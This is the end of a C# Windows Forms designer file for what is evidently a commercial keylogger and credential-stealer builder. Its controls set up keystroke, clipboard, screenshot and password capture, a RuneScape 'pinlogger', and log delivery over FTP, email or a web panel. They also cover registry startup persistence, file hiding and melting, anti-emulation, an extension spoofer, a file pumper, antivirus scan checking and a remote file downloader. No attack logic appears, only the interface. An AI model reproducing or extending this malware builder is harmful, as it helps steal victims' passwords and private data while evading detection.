            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(765, 518);
            this.Controls.Add(this.Theme);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MinimumSize = new System.Drawing.Size(765, 518);
            this.Name = "Form1";
            this.Text = "Form1";
            this.Theme.ResumeLayout(false);
            this.panelGeneral.ResumeLayout(false);
            this.panelGeneral.PerformLayout();
            this.panelInstallation.ResumeLayout(false);
            this.panelInstallation.PerformLayout();
            this.gbOther.ResumeLayout(false);
            this.gbStartup.ResumeLayout(false);
            this.gbInstallation.ResumeLayout(false);
            this.gbInstallation.PerformLayout();
            this.panelBuild.ResumeLayout(false);
            this.panelBuild.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pbIcon)).EndInit();
            this.panelAVScanner.ResumeLayout(false);
            this.panelAVScanner.PerformLayout();
            this.panelNews.ResumeLayout(false);
            this.panelDelivery.ResumeLayout(false);
            this.panelDelivery.PerformLayout();
            this.gbWebPanel.ResumeLayout(false);
            this.gbFTP.ResumeLayout(false);
            this.gbEmail.ResumeLayout(false);
            this.panelAbout.ResumeLayout(false);
            this.panelAbout.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pbAbout)).EndInit();
            this.panelExtensionSpoofer.ResumeLayout(false);
            this.panelExtensionSpoofer.PerformLayout();
            this.panelAccountInfo.ResumeLayout(false);
            this.panelAccountInfo.PerformLayout();
            this.panelAssembly.ResumeLayout(false);
            this.panelAssembly.PerformLayout();
            this.panelSystemCure.ResumeLayout(false);
            this.panelSystemCure.PerformLayout();
            this.panelFilePumper.ResumeLayout(false);
            this.panelFilePumper.PerformLayout();
            this.panelPasswordRecovery.ResumeLayout(false);
            this.panelPasswordRecovery.PerformLayout();
            this.panelMiscellaneous.ResumeLayout(false);
            this.panelMiscellaneous.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private NSTheme Theme;
        private System.Windows.Forms.TreeView treeView1;
        private System.Windows.Forms.Panel panelKeylogger;
        private NSLabel ipAddressLabel;
        private NSLabel usernameLabel;
        private NSLabel GUIDLabel;
        private NSLabel versionLabel;
        private NSLabel lastUpdateLabel;
        private NSLabel onlineUsersLabel;
        private NSControlButton nsControlButton1;
        private System.Windows.Forms.Panel panelDelivery;
        private Ambiance_Button_1 btnTestDelivery;
        private Ambiance_NumericUpDown nudLogInterval;
        private Ambiance_Label lblLogInterval;
        private System.Windows.Forms.GroupBox gbWebPanel;
        private Amiance_TextBox tbWebPanelUploadKey;
        private System.Windows.Forms.GroupBox gbFTP;
        private Amiance_TextBox tbFTPPassword;
        private Amiance_TextBox tbFTPUsername;
        private Amiance_TextBox tbFTPServer;
        private Ambiance_RadioButton rbPanel;
        private Ambiance_RadioButton rbFTP;
        private Ambiance_RadioButton rbEmail;
        private System.Windows.Forms.GroupBox gbEmail;
        private Ambiance_CheckBox cbSSL;
        private Amiance_TextBox tbEmailPort;
        private Amiance_TextBox tbEmailServer;
        private Amiance_TextBox tbEmailPassword;
        private Amiance_TextBox tbEmailUsername;
        private Ambiance_Separator separator1;
        private Ambiance_HeaderLabel lblDeliveryMethod;
        private System.Windows.Forms.Panel panelNews;
        private System.Windows.Forms.Panel panelAbout;
        private System.Windows.Forms.PictureBox pbAbout;
        private Ambiance_Label lblAboutInfo;
        private Ambiance_Separator separator9;
        private Ambiance_HeaderLabel lblAbout;
        private System.Windows.Forms.Panel panelFilePumper;
        private Ambiance_Separator ambiance_Separator1;
        private Ambiance_HeaderLabel ambiance_HeaderLabel5;
        private NSButton cmdSelectFileToPump;
        private System.Windows.Forms.Label labelSize;
        private NSTextBox textBoxPumpSize;
        private System.Windows.Forms.Label labelPumpFilePath;
        private NSButton cmdDoPumpFile;
        private System.Windows.Forms.Panel panelExtensionSpoofer;
        private NSButton cmdDoSpoofExt;
        private NSButton nsButton2;
        private System.Windows.Forms.Label labelExt;
        private NSTextBox textBoxSpoofExt;
        private System.Windows.Forms.Label labelSpoofFilePath;
        private Ambiance_Separator ambiance_Separator2;
        private Ambiance_HeaderLabel ambiance_HeaderLabel6;
        private System.Windows.Forms.Panel panelBuild;
        private System.Windows.Forms.PictureBox pbIcon;
        private Ambiance_ListBox lbBuildLog;
        private Ambiance_Label lblBuildLog;
        private Ambiance_Button_1 btnBrowseIcon;
        private Amiance_TextBox tbIconPath;
        private Ambiance_CheckBox cbChangeIcon;
        private Ambiance_Separator separator7;
        private Ambiance_HeaderLabel lblBuild;
        private Ambiance_Button_1 btnBuild;
        private System.Windows.Forms.Panel panelSystemCure;
        private Ambiance_Label lblVaccineLog;
        private Ambiance_ListBox lbVaccineLog;
        private Ambiance_Button_1 btnRemoveKeylogger;
        private Ambiance_Separator separator8;
        private Ambiance_HeaderLabel lblVaccine;
        private Ambiance_Label lblVaccineInfo;
        private System.Windows.Forms.Panel panelInstallation;
        private System.Windows.Forms.GroupBox gbOther;
        private Ambiance_CheckBox cbHideFile;
        private Ambiance_CheckBox cbStartupPersistence;
        private System.Windows.Forms.GroupBox gbStartup;
        private Ambiance_CheckBox cbHKLM;
        private Ambiance_CheckBox cbHKCU;
        private Amiance_TextBox tbHKLM;
        private Amiance_TextBox tbHKCU;
        private System.Windows.Forms.GroupBox gbInstallation;
        private Amiance_TextBox tbProcess;
        private Ambiance_Label lblProcess;
        private Ambiance_ComboBox comboBoxDirectory;
        private Ambiance_Label lblSubfolder;
        private Amiance_TextBox tbSubfolder;
        private Ambiance_Label lblDirectory;
        private Ambiance_Toggle cbInstallation;
        private Ambiance_Separator separator2;
        private Ambiance_HeaderLabel lblInstallation;
        private System.Windows.Forms.Panel panelPasswordRecovery;
        private System.Windows.Forms.ListView lvPasswordRecovery;
        private System.Windows.Forms.ColumnHeader chSoftware;
        private System.Windows.Forms.ColumnHeader chVersions;
        private Ambiance_Toggle cbPasswordRecovery;
        private Ambiance_Separator separator5;
        private Ambiance_HeaderLabel lblPasswordRecovery;
        private System.Windows.Forms.Panel panelGeneral;
        private Ambiance_CheckBox cbClearSavedPasswords;
        private Ambiance_CheckBox cbRuneScapePinlogger;
        private Ambiance_CheckBox cbProcessProtection;
        private Ambiance_CheckBox cbAntiEmulation;
        private Ambiance_CheckBox cbCaptureScreenshots;
        private Ambiance_CheckBox cbMeltFile;
        private Ambiance_CheckBox cbModifyTaskManager;
        private Ambiance_CheckBox cbClipboardLogger;
        private Ambiance_Label lblMutex;
        private Amiance_TextBox tbMutex;
        private NSRandomPool randomPool;
        private Ambiance_Separator separator3;
        private Ambiance_HeaderLabel lblGeneralSettings;
        private System.Windows.Forms.Panel panelMiscellaneous;
        private Ambiance_Label lblDelayExecution;
        private Ambiance_NumericUpDown nudDelayExecution;
        private Ambiance_CheckBox cbDelayExecution;
        private Amiance_TextBox tbMessageBoxBody;
        private Ambiance_ComboBox comboBoxMessageBoxType;
        private Ambiance_Label lblMessageBoxType;
        private Ambiance_CheckBox cbMessageBox;
        private Amiance_TextBox tbMessageBoxTitle;
        private Ambiance_ComboBox comboBoxFileType;
        private Ambiance_Label lblFileType;
        private Ambiance_CheckBox cbFileDownloader;
        private Amiance_TextBox tbFileDownloader;
        private Ambiance_Separator separator4;
        private Ambiance_HeaderLabel lblMiscellaneousSettings;
        private System.Windows.Forms.Panel panelAssembly;
        private Ambiance_Label lblVersion;
        private Ambiance_Label lblCopyright;
        private Ambiance_Label lblProduct;
        private Ambiance_Label lblCompany;
        private Ambiance_Label lblDescriptionAsm;
        private Ambiance_Label lblTitle;
        private Amiance_TextBox tbVersion;
        private Amiance_TextBox tbCopyright;
        private Amiance_TextBox tbProduct;
        private Amiance_TextBox tbCompany;
        private Amiance_TextBox tbDescription;
        private Amiance_TextBox tbTitle;
        private Ambiance_CheckBox cbChangeAssembly;
        private Ambiance_Separator separator6;
        private Ambiance_HeaderLabel lblAssembly;
        private System.Windows.Forms.Panel panelAccountInfo;
        private Ambiance_Label usernameText;
        private Ambiance_Separator ambiance_Separator3;
        private Ambiance_HeaderLabel ambiance_HeaderLabel7;
        private Ambiance_Label onlineUsersText;
        private Ambiance_Label ipAddressText;
        private Ambiance_Label lastUpdateText;
        private Ambiance_Label GUIDText;
        private Ambiance_Label versionText;
        private NSButton webpanelButton;
        private NSButton forumsButton;
        private NSButton updateButton;
        private NSButton subscriptionButton;
        private NSLabel newsLabel;
        private NSTextBox NewsText;
        private System.Windows.Forms.Panel panelAVScanner;
        private System.Windows.Forms.Label bbCodeLabel;
        private System.Windows.Forms.Label linkLabel;
        private System.Windows.Forms.Label rateLabel;
        private NSTextBox scanBrowseTextbox;
        private NSButton scanBrowseButton;
        private System.Windows.Forms.Label scanStatusLabel;
        private NSButton avScanButton;
        private NSTextBox scanbbcodeTextBox;
        private NSTextBox scanLinkTextBox;
        private NSTextBox scanRateTextBox;
        private System.Windows.Forms.ListView lvwScanner;


    }
}